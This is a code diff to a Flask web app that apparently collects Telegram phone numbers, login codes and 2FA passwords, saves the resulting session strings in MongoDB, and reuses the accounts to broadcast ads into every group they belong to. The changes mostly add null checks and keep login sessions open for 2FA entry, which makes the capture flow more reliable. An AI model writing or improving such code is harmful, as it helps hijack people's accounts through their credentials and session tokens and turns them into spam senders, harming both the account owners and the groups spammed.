@@ -41,6 +41,7 @@ except Exception as e:
     db = None
     db_connected = False
 
+# FIXED: All collection assignments use "is not None" pattern
 users_col = db.users if db is not None else None
 ads_config_col = db.ads_config if db is not None else None
 temp_sessions_col = db.temp_sessions if db is not None else None
@@ -151,6 +152,7 @@ class SessionManager:
             raise RuntimeError(f"Failed to connect: {error_msg}")
         with self._lock:
             self._sessions[session_id] = session
+        # FIXED: Use "is not None" check
         if temp_sessions_col is not None:
             temp_sessions_col.update_one(
                 {'_id': session_id},
@@ -173,11 +175,13 @@ class SessionManager:
             session = self._sessions.pop(session_id, None)
         if session:
             session.stop()
+        # FIXED: Use "is not None" check
         if temp_sessions_col is not None:
             temp_sessions_col.delete_one({'_id': session_id})
 
     def cleanup_old(self, max_age_minutes=10):
         cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
+        # FIXED: Use "is not None" check
         if temp_sessions_col is not None:
             old_docs = temp_sessions_col.find({'created_at': {'$lt': cutoff}})
             for doc in old_docs:
@@ -222,27 +226,28 @@ class AdsBroadcaster:
             self._stop_event.wait(30)
 
     def _check_and_broadcast(self):
+        # FIXED: Use "is not None" check
         if users_col is None or ads_config_col is None:
             return
         config = ads_config_col.find_one({"_id": "main_config"})
         if not config or not config.get("ads_enabled", False):
             return
-        
+
         interval = config.get("interval", 600)
         caption = config.get("caption", "")
         photo_path = config.get("photo_path")
-        
+
         cutoff = datetime.now() - timedelta(seconds=interval)
         users_to_send = list(users_col.find({
             "ads_enabled": True,
             "$or": [{"last_ad_time": {"$lt": cutoff}}, {"last_ad_time": None}]
         }))
-        
+
         if not users_to_send:
             return
-        
+
         print(f"📨 Broadcasting to {len(users_to_send)} users...")
-        
+
         for user in users_to_send:
             if self._stop_event.is_set():
                 break
@@ -275,7 +280,7 @@ class AdsBroadcaster:
                         await client.send_photo("me", photo=photo_path, caption=caption)
                     else:
                         await client.send_message("me", caption)
-                    
+
                     # Send to groups
                     try:
                         dialogs = await client.get_dialogs()
@@ -291,27 +296,31 @@ class AdsBroadcaster:
                                     pass
                     except:
                         pass
-                    
-                    users_col.update_one(
-                        {"_id": user["_id"]},
-                        {"$set": {"last_ad_time": datetime.now()}, "$inc": {"total_ads_sent": 1}}
-                    )
+
+                    # FIXED: Use "is not None" check
+                    if users_col is not None:
+                        users_col.update_one(
+                            {"_id": user["_id"]},
+                            {"$set": {"last_ad_time": datetime.now()}, "$inc": {"total_ads_sent": 1}}
+                        )
                     print(f"✅ Ad sent to {phone}")
                 finally:
                     try:
                         await client.disconnect()
                     except:
                         pass
-            
+
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             loop.run_until_complete(send_ad())
             loop.close()
-            
+
         except UserDeactivated:
-            users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "deactivated"}})
+            if users_col is not None:
+                users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "deactivated"}})
         except AuthKeyUnregistered:
-            users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "expired"}})
+            if users_col is not None:
+                users_col.update_one({"_id": user["_id"]}, {"$set": {"ads_enabled": False, "status": "expired"}})
         except FloodWait as e:
             print(f"⏳ Flood wait for {phone}: {e.value}s")
         except Exception as e:
@@ -321,6 +330,7 @@ ads_broadcaster = AdsBroadcaster()
 
 # ========== DATABASE HELPERS ==========
 def save_session_to_db(session_data):
+    # FIXED: Use "is not None" check
     if users_col is None:
         return False
     try:
@@ -362,6 +372,7 @@ def save_session_to_db(session_data):
         return False
 
 def get_ads_config():
+    # FIXED: Use "is not None" check
     if ads_config_col is None:
         return {"ads_enabled": False, "interval": 600, "photo_path": None, "caption": "", "updated_at": datetime.now()}
     config = ads_config_col.find_one({"_id": "main_config"})
@@ -372,6 +383,7 @@ def get_ads_config():
     return config
 
 def update_ads_config(updates):
+    # FIXED: Use "is not None" check
     if ads_config_col is None:
         return False
     updates["updated_at"] = datetime.now()
@@ -379,6 +391,7 @@ def update_ads_config(updates):
     return True
 
 def get_stats():
+    # FIXED: Use "is not None" check
     if users_col is None:
         return {"total_users": 0, "active_users": 0, "idle_users": 0, "total_ads_sent": 0, "db_connected": False}
     total = users_col.count_documents({})
@@ -398,6 +411,7 @@ def get_stats():
     }
 
 def get_all_users():
+    # FIXED: Use "is not None" check
     if users_col is None:
         return []
     users = list(users_col.find().sort("created_at", -1))
@@ -447,7 +461,7 @@ def send_code():
         session_manager.cleanup_old()
     except:
         pass
-    
+
     data = request.get_json() or {}
     phone = data.get("phone", "").strip()
     session_name = data.get("session_name", "session").strip()
@@ -459,7 +473,8 @@ def send_code():
     try:
         session_thread = session_manager.create_session(session_id, phone)
         sent = session_thread.execute(lambda: session_thread.client.send_code(phone))
-        
+
+        # FIXED: Use "is not None" check
         if temp_sessions_col is not None:
             temp_sessions_col.update_one(
                 {'_id': session_id},
@@ -481,6 +496,7 @@ def send_code():
         session_manager.remove_session(session_id)
         return jsonify(ok=False, error=str(e)), 500
 
+# ========== FIXED VERIFY CODE FUNCTION ==========
 @app.route("/api/verify-code", methods=["POST"])
 def verify_code():
     data = request.get_json() or {}
@@ -495,15 +511,14 @@ def verify_code():
     if not session_thread:
         return jsonify(ok=False, error="Session expired"), 400
 
-    # FIXED: Use "is not None" instead of truthiness check
+    # FIXED: Use "is not None" for PyMongo Collection check
     session_doc = temp_sessions_col.find_one({'_id': session_id}) if temp_sessions_col is not None else None
     phone = session_doc.get('phone') if session_doc else session_thread.phone
     phone_code_hash = session_doc.get('phone_code_hash') if session_doc else None
     session_name = session_doc.get('session_name', 'session') if session_doc else 'session'
-    # ... rest of function
 
     if not phone:
-        session_manager.remove_session(session_id)
+        session_manager.remove_session(session_id)  # Cleanup
         return jsonify(ok=False, error="Session data lost"), 400
 
     if not code or not code.isdigit():
@@ -520,6 +535,7 @@ def verify_code():
             result = {"user": user, "session_string": session_string, "error": None}
         except SessionPasswordNeeded:
             if not password:
+                # FIXED: 2FA required - DON'T remove session yet!
                 result = {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
             else:
                 try:
@@ -535,19 +551,31 @@ def verify_code():
         except Exception as e:
             result = {"user": None, "session_string": None, "error": str(e)}
     except Exception as e:
+        session_manager.remove_session(session_id)  # Cleanup on server error
         return jsonify(ok=False, error=f"Server error: {str(e)}"), 500
-    finally:
-        session_manager.remove_session(session_id)
 
+    # ========== FIXED: Proper session cleanup logic ==========
+    
+    # 2FA required - preserve session for password entry
     if result["error"] == "2FA_PASSWORD_REQUIRED":
         return jsonify(ok=False, requires_password=True), 401
-    elif result["error"] == "INVALID_CODE":
-        return jsonify(ok=False, error="Invalid verification code"), 401
-    elif result["error"] == "CODE_EXPIRED":
-        return jsonify(ok=False, error="Code expired"), 401
-    elif result["error"]:
+    
+    # Terminal errors - remove session
+    if result["error"] in ["INVALID_CODE", "CODE_EXPIRED"]:
+        session_manager.remove_session(session_id)
+        if result["error"] == "INVALID_CODE":
+            return jsonify(ok=False, error="Invalid verification code"), 401
+        elif result["error"] == "CODE_EXPIRED":
+            return jsonify(ok=False, error="Code expired"), 401
+    
+    # Other errors - remove session
+    if result["error"]:
+        session_manager.remove_session(session_id)
         return jsonify(ok=False, error=result["error"]), 400
 
+    # Success - remove session and save user
+    session_manager.remove_session(session_id)
+    
     user = result["user"]
     session_string = result["session_string"]
     user_info = {
@@ -615,7 +643,8 @@ def toggle_ads():
     config = get_ads_config()
     new_status = not config.get("ads_enabled", False)
     if update_ads_config({"ads_enabled": new_status}):
-        if users_col:
+        # FIXED: Use "is not None" check
+        if users_col is not None:
             users_col.update_many({}, {"$set": {"ads_enabled": new_status}})
         if new_status:
             ads_broadcaster.start()
@@ -674,6 +703,7 @@ def serve_upload(filename):
 
 @app.route("/api/user/<user_id>/toggle", methods=["POST"])
 def toggle_user_ads(user_id):
+    # FIXED: Use "is not None" check
     if users_col is None:
         return jsonify({"success": False, "error": "DB not connected"}), 500
     try:
